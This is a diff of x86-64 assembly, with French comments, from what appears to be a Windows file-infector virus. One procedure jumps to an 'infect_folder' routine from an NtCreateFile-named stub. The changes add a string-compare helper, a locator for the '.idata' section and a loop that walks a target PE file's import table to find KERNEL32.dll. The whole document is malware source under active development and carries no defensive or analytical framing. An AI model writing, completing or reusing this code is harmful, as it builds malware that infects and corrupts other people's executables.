@@ -557,22 +557,57 @@ get_rip proc
 get_rip endp
 
 proc_nt_create_file proc
-jmp [qword ptr infect_folder]
+	jmp [qword ptr infect_folder]
 proc_nt_create_file endp
 
+ft_strequ proc ; int8_t strequ(const char *str1, const char *str2) ; return 1 if str1 == str2, return 0 else
+	push rbp
+	push r8
+	mov rbp, rsp
+
+	mov rax, 0
+debut_boucle_ft_strequ:
+	cmp byte ptr [rcx], 0
+	je stop_ft_strequ
+	cmp byte ptr [rdx], 0
+	je stop_ft_strequ
+	mov r8b, byte ptr [rcx] 
+	cmp r8b, byte ptr [rdx]
+	jne stop_ft_strequ_not_equal
+	inc rcx
+	inc rdx
+	jmp debut_boucle_ft_strequ
+stop_ft_strequ:
+	mov r8b, byte ptr [rcx] 
+	cmp r8b, byte ptr [rdx]
+	jne stop_ft_strequ_not_equal
+	mov rax, 1
+stop_ft_strequ_not_equal:
+	mov rsp, rbp
+	pop r8
+	pop rbp
+	ret
+ft_strequ endp
+
 ; rbp
+; 64 - 72   : Virtual Address de idata
+; 56 - 64	: PointerToRawData de idata
+; 48 - 56	: tmp storage for rax
 ; 40 - 48   : taille du fichier
 ; 32 - 40	: void *fichier
 ; 00 - 32	: shadow
 ; rsp
 
+KERNEL_32_DLL_NAME db 'KERNEL32.dll',0h
+
 init_imports proc ; void init_imports(void *fichier, int taille_du_ficher)
 	push rbp
 	mov rbp, rsp
-	sub rsp, 48
+	sub rsp, 72
 
 	mov qword ptr [rsp + 32], rcx
 	mov qword ptr [rsp + 40], rdx ; on sauvegarde les parametres
+	
 
 	mov rax, rcx
 	add rax, 3ch
@@ -582,13 +617,47 @@ init_imports proc ; void init_imports(void *fichier, int taille_du_ficher)
 	add rax, rdx
 
 	add rax, 4
+	
+	mov [rsp + 48], rax
+
 	mov rcx, rax
 	mov rdx, qword ptr [rsp + 40]
 	call get_idata_values
 
+	mov [rsp + 56], rdx
+	mov [rsp + 64], rcx
+	
+	mov rax, qword ptr [rsp + 48]
+
 	add rax, 8ch ; Champ import directory rva
+	xor rbx, rbx
+	mov ebx, dword ptr [rax] ; on met la rva d'import directory dans rbx
+	sub rbx, rcx
+	add rbx, rdx ; on transforme ca en file offset
+	add rbx, qword ptr [rsp + 32] ; on ajoute l'addresse ou est charge le fichier
+	mov rax, rbx ; on met ca dans rax
+
+debut_boucle_init_imports_find_kernel32:
+	add rax, 0ch ; on va sur le champ Name
+	mov [rsp + 48], rax
+
+	xor rbx, rbx
+	mov ebx, dword ptr [rax]
+	sub rbx, qword ptr [rsp + 64]
+	add rbx, qword ptr [rsp + 56]
+	add rbx, qword ptr [rsp + 32] ; on transforme la rva en file offset puis on ajoute l'adresse memoire
+	lea rcx, KERNEL_32_DLL_NAME
+	mov rdx, rbx
+	call ft_strequ
+	cmp rax, 1
+	je fin_boucle_init_imports_find_kernel32
+	mov rax, qword ptr [rsp + 48]
+	add rax, 8
+	jmp debut_boucle_init_imports_find_kernel32
 
 
+fin_boucle_init_imports_find_kernel32:
+	
 	mov rsp, rbp
 	pop rbp
 	ret
@@ -597,6 +666,7 @@ init_imports endp
 
 get_idata_values proc ; get_idata_values(void *file_header, int taille_du_fichier). Retourne VirtualAddress dans rcx, et PointerToRawData dans rdx
 	push rbp
+	push rbx
 	mov rbp, rsp
 	sub rsp, 32
 
@@ -607,15 +677,24 @@ get_idata_values proc ; get_idata_values(void *file_header, int taille_du_fichie
 	mov bx, word ptr [rax]
 	add rax, rbx
 	add rax, 4
-
-	xor rbp, rbx
+debut_boucle_get_idata:
+	xor rbx, rbx
 	mov ebx, 00006174h
 	rol rbx, 32
+	mov rdx, rbx
 	mov ebx, 6164692eh
+	or	rbx, rdx
 	cmp qword ptr [rax], rbx
-
+	je	fin_boucle_get_idata
+	add rax, 28h
+	jmp	debut_boucle_get_idata
+fin_boucle_get_idata:
+	mov ecx, dword ptr [rax + 0ch]
+	mov edx, dword ptr [rax + 014h]
 	mov rsp, rbp
+	pop rbx
 	pop rbp
+	ret
 get_idata_values  endp
 
 label_fin:
